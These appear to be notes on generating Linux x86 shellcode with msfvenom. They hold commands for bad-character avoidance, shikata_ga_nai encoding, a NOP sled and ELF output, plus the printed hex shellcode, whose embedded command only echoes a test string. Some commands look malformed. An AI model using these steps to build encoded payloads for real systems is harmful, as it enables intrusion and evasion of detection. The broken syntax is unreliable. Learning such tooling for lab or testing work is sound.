msfvenom --payload linux/x86/exec --platform linux  --arch x86 --format hex c
         --bad-chars '\x00' '\xa0' '\x0d' '\x20' CMD="echo testing exploit:pwn!"

Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_naisucceededwithsize 89 (iteration=0)
x86/shikata_ga_naichosenwithfinal size 89
Payload size: 89 bytes
Final size of hexfile: 178 bytes
bdcc755e9cdac7d97424f45b29c9b11083ebfc316b10036b102e803497f6f29bc16e287f87895a50
e43d9bc625dff278b3fc576dd802586dba6130026431a5af10d04b37f947ecc795e8655c5cd605eb
ce37e6445cbe07a7e2


#Produce elf formated files
msfvenom --payload linux/x86/exec --platform linux  --arch x86 --format hex c
         --bad-chars '\x00' '\xa0' '\x0d' '\x20' CMD="echo testing exploit:pwn!" –f elf> result.elf

#Encoder
msfvenom --payload linux/x86/exec --platform linux  --arch x86 --format hex c
         --bad-chars '\x00' '\xa0' '\x0d' '\x20' -e x86/shikata_ga_nai- 4 CMD="echo testing exploit:pwn!"

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_naisucceededwithsize 89 (iteration=0)
x86/shikata_ga_naichosenwithfinal size 89
Successfully added NOP sled from x86/single_byte
Payload size: 93 bytes
Final size of hexfile: 186 bytes
27f5d63fd9cabe7c97edffd97424f45d29c9b11031751903751983edfc9e6287f406140a6dde0bc8
f8f93c21886dbd55410fd4cb142c74fc3cb279fc27d1119387418718bc0029b81cb7cd36315847c3
f386e75c6ae707f4216ee63745